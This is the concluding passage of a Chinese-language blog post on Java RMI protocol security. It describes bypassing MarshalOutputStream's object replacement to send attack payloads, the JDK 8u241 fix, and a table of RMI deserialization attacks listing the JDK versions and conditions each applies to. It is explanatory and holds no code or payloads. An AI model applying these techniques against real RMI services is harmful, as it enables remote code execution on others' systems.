<blockquote><p>发包打远程的时候要注意<code>sun.rmi.server.MarshalOutputStream</code>会检测我们要序列化的obj，是否实现Remote/RemoteStub，由于UnicastRemoteObject实现了Remote，没有实现RemoteStub，于是会进入判断替换我们的obj，造成发包序列化异常。这里通过修改一份自己的MarshalOutputStream，去掉replaceObject来进行发包</p></blockquote> <p><img src="https://md.buptmerak.cn/uploads/upload_619d51c682baae26d72fded5be434b6a.png" alt=""></p> <p>当然oracle也注意到了这一问题，在jdk8u241，在调用<code>UnicastRef.invoke</code>之前，做了一个检测。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_6d32b2c114f7cf25029cbca632dc1348.png" alt=""></p> <p><img src="https://md.buptmerak.cn/uploads/upload_71a41f56b4a344329256b80e2223a41f.png" alt=""></p> <p>声明方法的类，必须要实现Remote接口，然而这里的RMIServerSocketFactory并没有实现，于是无法进入到invoke方法，直接抛出错误。</p> <h2 id="_0x04小结"><a href="#_0x04小结" class="header-anchor">#</a> 0x04小结</h2> <p>本文主要是对JAVA RMI协议流程和其相关的安全问题进行了一些整理。</p> <p>JAVA实现远程方法调用基于JRMP协议。为了对远程对象进行内存管理引入了DGC协议，为了方便用户获得OjbID和远程对象监听的地址引入了公共的Registry进行管理，为了方便从加载远程类引入了codebase机制。</p> <p>然而方便和安全往往存在着冲突，远程加载类会有远程任意代码执行的执行的风险，远程方法参数/异常/返回值在反序列化重建的过程也会带来安全隐患。因此在更新的版本中默认关闭了codebase，对于公共的Registry远程对象的函数参数和DGC调用结果进行了严格的反序列化过滤，而对于需要参数/返回值高度自定义化的私有远程对象隐藏了方法信息，提高了攻击难度。</p> <p>下面小结一下文章提到的几种攻击方法和条件</p> <table><thead><tr><th style="text-align:center;">攻击类型</th> <th style="text-align:center;">适用jdk版本</th> <th style="text-align:center;">需要条件</th></tr></thead> <tbody><tr><td style="text-align:center;">加载远程类</td> <td style="text-align:center;">&lt;7u21、6u45</td> <td style="text-align:center;">无</td></tr> <tr><td style="text-align:center;">加载远程类</td> <td style="text-align:center;">任意</td> <td style="text-align:center;">SecurityManager allow/ java.rmi.server.useCodebaseOnly=false</td></tr> <tr><td style="text-align:center;">远程对象方法参数反序列化</td> <td style="text-align:center;">&lt;8u242</td> <td style="text-align:center;">远程对象参数除int、boolean等基本类/服务端存在反序列化链</td></tr> <tr><td style="text-align:center;">远程对象方法参数反序列化</td> <td style="text-align:center;">任意</td> <td style="text-align:center;">远程对象参数除int、boolean等基本类和String类/远程对象环境存在反序列化链</td></tr> <tr><td style="text-align:center;">Registry方法参数反序列化</td> <td style="text-align:center;">&lt;8u121，7u13，6u141</td> <td style="text-align:center;">Registry端存在反序列化链</td></tr> <tr><td style="text-align:center;">远程对象方法结果</td> <td style="text-align:center;">任意</td> <td style="text-align:center;">调用端存在反序列化环境</td></tr> <tr><td style="text-align:center;">DGC方法返回值存在反序列化</td> <td style="text-align:center;">&lt;8u121，7u13，6u141</td> <td style="text-align:center;">调用端存在反序列化链</td></tr> <tr><td style="text-align:center;">JRMI CALL 报错反序列化</td> <td style="text-align:center;">任意</td> <td style="text-align:center;">调用端存在反序列化链</td></tr> <tr><td style="text-align:center;">Registry bind/rebind 触发JRMI CALL报错</td> <td style="text-align:center;">&lt;8u231</td> <td style="text-align:center;">Registry存在反序列化链</td></tr> <tr><td style="text-align:center;">Registry 方法参数反序列化触发JRMI CALL报错</td> <td style="text-align:center;">&lt;8u241</td> <td style="text-align:center;">Registry存在反序列化链</td></tr></tbody></table> <h2 id="参考资料"><a href="#参考资料" class="header-anchor">#</a> 参考资料</h2> <p>attack-rmi-registry-and-server-with-socket
https://xz.aliyun.com/t/8247</p> <p>从懵逼到恍然大悟之Java中RMI的使用
https://blog.csdn.net/lmy86263/article/details/72594760</p> <p>针对RMI服务的九重攻击 - 上
https://xz.aliyun.com/t/7930</p> <p>针对RMI服务的九重攻击 - 下
https://xz.aliyun.com/t/7932</p> <p>深入学习rmi工作原理
https://xz.aliyun.com/t/8644</p> <p>remote method guesser
https://github.com/qtc-de/remote-method-guesser</p> <p>RMI Bypass Jep290（Jdk8u231）反序列化漏洞分析
https://www.anquanke.com/post/id/211722#h3-6</p></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/EkiXu/blog/edit/master/docs/_posts/JAVA 协议安全笔记-RMI篇.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2022/05/18, 16:49:51</span></div></div> <div class="page-nav-wapper"><!----> <!----></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/qwb2022final/"><div>
            QWB CTF2022 线下赛总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/ciscn2022final/"><div>
            CISCN2022 总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/dsctf2022_final/"><div>
            DSCTF2022决赛 部分writeup
            <!----></div></a> <span class="date">08-08</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:ekixu@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/EkiXu" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2022
    <span>EkiXu | <a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <div class="body-bg" style="background:url() center center / cover no-repeat;opacity:0.5;"></div> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.8153bfb8.js" defer></script><script src="/assets/js/2.236d623d.js" defer></script><script src="/assets/js/68.fafb9569.js" defer></script>
  </body>
</html>
